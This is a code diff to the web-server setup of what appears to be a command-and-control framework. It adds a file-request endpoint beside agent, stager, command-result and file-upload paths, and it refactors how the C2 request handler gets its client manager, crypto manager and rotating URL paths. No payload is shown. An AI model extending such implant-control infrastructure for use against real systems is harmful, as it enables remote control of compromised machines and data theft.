@@ -52,7 +52,8 @@ def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ss
                         "agent_path": "/raw_agent",
                         "stager_path": "/b64_stager",
                         "cmd_result_path": "/command_result",
-                        "file_upload_path": "/file_upload"
+                        "file_upload_path": "/file_upload",
+                        "file_request_path": "/file_request"
                     }
             else:
                 # Default URL paths
@@ -61,7 +62,8 @@ def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ss
                     "agent_path": "/raw_agent",
                     "stager_path": "/b64_stager",
                     "cmd_result_path": "/command_result",
-                    "file_upload_path": "/file_upload"
+                    "file_upload_path": "/file_upload",
+                    "file_request_path": "/file_request"
                 }
         
         # Create path rotation manager
@@ -77,18 +79,15 @@ def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ss
             path_manager.load_state()
             logger(f"Path rotation enabled with interval {rotation_interval} seconds")
         
-        # Set up the server with the handler
-        handler = lambda *args: C2RequestHandler(
-            *args, 
-            client_manager=client_manager, 
-            logger=logger, 
-            crypto_manager=crypto_manager, 
-            campaign_name=campaign_name,
-            url_paths=url_paths if not path_rotation else path_manager.get_current_paths()
-        )
+        # Create server with necessary attributes
+        httpd = ThreadedHTTPServer((ip, port), C2RequestHandler)
         
-        # Create server
-        httpd = ThreadedHTTPServer((ip, port), handler)
+        # Attach all necessary objects to server instance so handler can access them
+        httpd.client_manager = client_manager
+        httpd.logger_func = logger
+        httpd.crypto_manager = crypto_manager
+        httpd.campaign_name = campaign_name
+        httpd.url_paths = url_paths
         
         # Attach the client verifier to the server
         httpd.client_verifier = client_verifier
